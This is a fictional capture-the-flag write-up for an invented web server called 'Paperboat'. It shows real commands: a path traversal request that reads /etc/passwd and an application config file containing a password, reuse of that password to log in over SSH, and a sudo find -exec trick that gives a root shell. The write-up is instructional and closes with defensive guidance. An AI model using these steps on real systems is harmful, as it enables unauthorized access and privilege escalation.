---
title: "Paperboat (fictional)"
platform: other
category: web
difficulty: easy
date: 2026-01-01
tags: [path-traversal, credential-reuse, sudo, gtfobins]
tools: [nmap, gobuster, curl, ssh]
fictional: true
---

# Paperboat (fictional)

> **Fictional example to show the format. Not a real room; nothing here was solved.**
> The machine, the IPs (192.0.2.0/24 is reserved for documentation, RFC 5737), the credentials
> and the output below are invented. Commands are real and the techniques are real, but no
> platform contains this machine.

## Summary

Paperboat is an imaginary Ubuntu web server that hosts an internal documentation viewer. The
viewer reads files named in a `file` parameter without restricting the path (path traversal,
CWE-22). That exposed the application's configuration file, which held a database password that
was reused for the `deploy` SSH account. `deploy` could run `find` as root through `sudo`, which
gives a root shell. Chain: path traversal, credentials in a file, password reuse, sudo misconfiguration.

## Reconnaissance

Full TCP port scan first, then default scripts and version detection only on the open ports.

```console
$ nmap -p- --min-rate 1000 -oA nmap/allports 192.0.2.10
Nmap scan report for 192.0.2.10
Host is up (0.041s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

$ nmap -sC -sV -p 22,80 -oA nmap/targeted 192.0.2.10
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-title: Paperboat Docs
(output trimmed: host keys omitted)
```

Only SSH and a web server are exposed. The versions point to Ubuntu 22.04. Nothing in the SSH
version is useful by itself, so the web application is the obvious place to start.

## Enumeration

Directory brute force to see what the web root hides:

```console
$ gobuster dir -u http://192.0.2.10 -w /usr/share/wordlists/dirb/common.txt -t 30
/index.html           (Status: 200) [Size: 612]
/static               (Status: 301) [Size: 178] [--> http://192.0.2.10/static/]
```

Not much. Browsing the site by hand, the front page links to its articles like this:

```text
http://192.0.2.10/view?file=getting-started.md
```

A parameter that takes a file name is a classic place to test for path traversal. The reply for
a normal request is the Markdown file rendered as text:

```console
$ curl -s 'http://192.0.2.10/view?file=getting-started.md' | head -n 3
# Getting started
Welcome to the Paperboat internal docs.
```

Next step: see whether `..` sequences escape the documents folder.

## Foothold / Exploitation

Requesting `/etc/passwd` four directories up:

```console
$ curl -s 'http://192.0.2.10/view?file=../../../../etc/passwd'
root:x:0:0:root:/root:/bin/bash
...
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
deploy:x:1001:1001::/home/deploy:/bin/bash
```

It works: the server joins our input to its documents folder without checking where the result
ends up. Two things to note: (1) there is a real user, `deploy`, with a login shell, and (2) the
web server runs as `www-data`, so only world-readable files are reachable.

Web apps usually keep secrets in their own configuration. nginx and `/etc/passwd` tell us the app
lives under `/var/www`, so the application folder is one level above `docs/`:

```console
$ curl -s 'http://192.0.2.10/view?file=../config.py'
DB_HOST = "127.0.0.1"
DB_USER = "paperboat"
DB_PASSWORD = "paperboat-Db-2024"
```

Passwords get reused. Trying this one against the only user with a shell:

```console
$ ssh deploy@192.0.2.10
deploy@192.0.2.10's password:
deploy@paperboat:~$ id
uid=1001(deploy) gid=1001(deploy) groups=1001(deploy)
```

Foothold as `deploy`.

## Privilege Escalation

First thing on a Linux box: what may this user run with `sudo`?

```console
deploy@paperboat:~$ sudo -l
User deploy may run the following commands on paperboat:
    (root) NOPASSWD: /usr/bin/find
```

`find` can execute arbitrary programs with `-exec`, so allowing it as root is the same as allowing
a root shell (listed on GTFOBins under "find", Sudo). `-quit` makes `find` stop after the first match:

```console
deploy@paperboat:~$ sudo find . -exec /bin/sh \; -quit
# id
uid=0(root) gid=0(root) groups=0(root)
```

Root.

## Flags

| Flag | Location | Value |
|------|----------|-------|
| user | `/home/deploy/user.txt` | `flag{...}` |
| root | `/root/root.txt` | `flag{...}` |

(Redacted on purpose. A real writeup never shows the value.)

## What I learned

- A file-name parameter should always be tested with `../` sequences.
- Reading the app's own config through a file-read bug is often the fastest way from "read files"
  to "valid credentials".
- `sudo -l` is the first privilege escalation check; any binary that can run commands (`find`,
  `vim`, `awk`, ...) is dangerous under `sudo`.

## What I would do differently

- Check for `/proc/self/cwd/` and the app's source file earlier instead of guessing paths.
- Try the discovered password against SSH right away, instead of looking for further bugs first.

## Defensive takeaway

| Weakness | Prevention | Detection | ATT&CK |
|----------|------------|-----------|--------|
| Path traversal in `file` parameter | Resolve the final path (`os.path.realpath`) and reject anything outside the docs folder, or serve from an allow-list of names | Web logs: requests containing `../` or `%2e%2e%2f` | T1190 Exploit Public-Facing Application |
| Password in a readable config file | Load secrets from the environment or a secret store; restrict file permissions; run the app in a confined user/container | File-integrity monitoring and web-log alerts for requests to config file names | T1552.001 Credentials In Files |
| Password reused for SSH | Unique credentials per service; SSH key authentication only, `PasswordAuthentication no` | Alert on SSH logins from unusual sources in `auth.log` | T1078 Valid Accounts |
| `sudo` on `find` | Least privilege: do not grant shell-capable binaries; if needed use a wrapper that fixes the arguments | auditd or sudo logs (`/var/log/auth.log`) for `sudo` running `find` with `-exec` | T1548.003 Sudo and Sudo Caching |

## References

- OWASP, Path Traversal: <https://owasp.org/www-community/attacks/Path_Traversal>
- CWE-22: <https://cwe.mitre.org/data/definitions/22.html>
- GTFOBins, find: <https://gtfobins.github.io/gtfobins/find/>
- RFC 5737, documentation address blocks: <https://www.rfc-editor.org/rfc/rfc5737>
- MITRE ATT&CK: <https://attack.mitre.org/>
